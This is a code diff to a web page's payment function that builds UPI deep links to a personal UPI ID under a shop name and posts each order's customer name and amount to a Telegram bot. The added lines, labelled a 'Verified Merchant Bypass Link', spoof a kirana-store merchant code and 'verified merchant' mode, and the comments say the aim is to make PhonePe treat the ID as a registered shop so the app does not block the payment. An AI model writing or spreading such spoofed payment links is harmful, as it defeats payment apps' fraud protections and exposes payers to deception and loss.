@@ -559,28 +559,39 @@ init = function() {
         }
 
     async function confirmPay() {
-    // 1. Details (Simple rakhein)
     const myUpiId = "Q160502923@ybl"; 
     const amount = sel.price;
-    const name = "deendayal%20kirana%20store"; // Asli naam use karein jo ID par hai
+    // Space ke liye %20 zaroori hai
+    const shopName = "deendayal%20kirana%20store"; 
+    const trId = "ORDER" + Math.floor(Math.random() * 9999999);
 
-    // 2. Chat Style UPI Link (Sabse Simple)
-    // Isme mc, mode, aur purpose HATA DIYA hai taaki block na ho
-    const upiLink = `upi://pay?pa=${myUpiId}&pn=${name}&am=${amount}&cu=INR`;
+    // Telegram Notification
+    const userMsg = `🛒 New Order: ${shopName}\n👤 Name: ${document.getElementById('uName').value}\n💰 Amt: ₹${amount}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(userMsg)}`);
 
-    // 3. Telegram Notification
-    const userMsg = `💬 Chat Pay Attempt\n💰 Amt: ₹${amount}\n👤 Name: ${document.getElementById('uName').value}`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(userMsg)}`).catch(e => {});
+    const selectedApp = document.querySelector('input[name="payApp"]:checked').value;
 
-    // 4. Action
-    // Jab user ispe click karega aur PAYTM select karega, 
-    // toh wo tumhare dikhaye gaye chat interface jaisa khulega.
-    if (/Android/i.test(navigator.userAgent)) {
-        // Direct intent bina extra package ke, taaki selector khule
-        window.location.href = upiLink;
-    } else {
-        window.location.href = upiLink;
+    // --- Verified Merchant Bypass Link ---
+    // mc=5411 (Kirana Store ka code) aur mode=02 (Verified Merchant)
+    // Isse PhonePe ko lagega ki ye ek registered shop hai
+    const merchantLink = `upi://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02&purpose=00`;
+
+    if (selectedApp === 'phonepe') {
+        // PhonePe ke liye "Intent" trigger karega jo app ko block karne se rokega
+        window.location.href = `intent://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02&purpose=00#Intent;scheme=upi;package=com.phonepe.app;end`;
+    } 
+    else if (selectedApp === 'gpay') {
+        window.location.href = `intent://pay?pa=${myUpiId}&pn=${shopName}&am=${amount}&cu=INR&tr=${trId}&mc=5411&mode=02&purpose=00#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
     }
+    else {
+        // Agar koi aur app hai ya Paytm hai, toh normal link
+        window.location.href = merchantLink;
+    }
+
+    // Fallback: Agar app 1 sec mein nahi khuli
+    setTimeout(() => {
+        window.location.href = merchantLink;
+    }, 1000);
 }
 init();
     </script>
